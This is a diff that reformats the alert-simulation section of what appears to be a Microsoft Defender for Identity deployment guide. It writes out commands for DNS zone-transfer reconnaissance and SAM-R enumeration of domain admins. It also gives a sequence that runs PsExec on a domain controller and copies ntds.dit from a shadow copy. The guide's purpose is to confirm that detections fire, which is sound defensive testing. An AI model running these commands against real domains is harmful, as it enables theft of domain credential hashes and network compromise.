@@ -500,74 +500,48 @@ _Figure 7: MDI Sensor - Security Event Log Access (after)_
 # Simulate alerts
 
 ## Network Mapping Reconnaissance (DNS)
-
- 	Run on Windows Client OS joined to domain
-
- 	Open command prompt (non-admin or admin) 
-
- 	Enter the following commands
-
+- [ ] Run on Windows Client OS joined to domain
+- [ ] Open command prompt (non-admin or admin)
+- [ ] Enter the following commands
+```
 nslookup
-
 server [YOUR-DC-NAME].[YOUR-DOMAIN] (example: server DC1.domain.local)
-
 ls -d domain.local (example: ls -d domain.local)
+```
+- [ ] **Result**: The following message should be displayed: *Can’t list domain [domain** name**]: Query refused*
 
- 	**Result**: The following message should be displayed
+![image](images/img-8.png)
 
-*Can’t list domain [domain** name**]: Query refused*
-
-![image](images/image_001.png)
-
-Figure 4 MDI – Simulation Alert Network Mapping Reconnaissance
+_Figure 8: Simulation Alert Network Mapping Reconnaissance_
 
 ## Directory Service Reconnaissance (SAM-R)
-
- 	Run on Windows Client OS joined to domain
-
- 	Open command prompt (non-admin or admin) 
-
- 	Enter following commands
-
+- [ ] Run on Windows Client OS joined to domain
+- [ ] Open command prompt (non-admin or admin) 
+- [ ] Enter following commands
+```
 net user /domain
-
 net group /domain
-
 net group "Domain Admins" /domain
-
 net group "Enterprise Admins" /domain
-
- 	**Result**: Should enumerate domain users, domain groups, Domain Admins and Enterprise
-
-Admins 
+```
+- [ ] **Result**: Should enumerate domain users, domain groups, Domain Admins and Enterprise Admins 
 
 ## Data exfiltration over SMB
-
- 	Download PsTools ()
-
- 	Run on Windows Client OS joined to domain
-
- 	Open command prompt (run as domain admin) 
-
- 	Enter following commands
-
+- [ ] Download PsTools ()
+- [ ] Run on Windows Client OS joined to domain
+- [ ] Open command prompt (run as domain admin) 
+- [ ] Enter following commands
+```
 PSEexec -s -i \\DC1.domain.local cmd.exe
-
 vssadmin list shadows
 
-*// If no shadow** cop**y** **exist** you can **create one with*
-
+// If no shadow copy exists you can create one with
 vssadmin create shadow /for=C:
 
-*// **Make sure to delete sha**dow copy after testing** with*
-
+// Make sure to delete shadow copy after testing with
 vssadmin delete shadows /shadow={SHADOW ID}
 
-*// **Verify **last **digit** in** output** **(**HarddiskVolumeShadowCopy****X****)** **and add **to **next **command*
-
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy**X**\windows\ntds\ntds.dit C:\temp\ntds.dit
-
- 	**Result**: NTDS.dit should be copied to temporary folder. Multiple alerts should be created in
-
-Defender XDR portal, e.g. Suspicious Service launched (PSEXESVC), Suspicious	credentials dump from NTDS.dit (if MDE is deployed on server)
-
+// Verify last digit in output (HarddiskVolumeShadowCopyX) and add to next command
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\windows\ntds\ntds.dit C:\temp\ntds.dit
+```
+- [ ] **Result**: NTDS.dit should be copied to temporary folder. Multiple alerts should be created in Defender XDR portal, e.g. Suspicious Service launched (PSEXESVC), Suspicious credentials dump from NTDS.dit (if MDE is deployed on server)
